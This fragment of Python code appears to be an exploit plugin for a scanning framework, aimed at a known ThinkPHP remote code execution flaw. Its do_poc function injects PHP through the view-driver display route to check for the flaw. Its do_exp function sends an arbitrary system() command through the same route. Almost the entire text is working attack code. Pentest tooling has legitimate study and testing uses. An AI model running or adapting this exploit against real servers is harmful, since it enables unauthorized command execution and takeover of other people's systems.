...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        rp = requests.get(url + "/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(xiaohei);?%3E",headers=heads,verify=False)
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='cmd':
            rp = requests.get(url + "/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20system("+exp_data['command']+");?%3E",headers=heads,verify=False)
            if  rp.text!="":
                result['Result'] = True
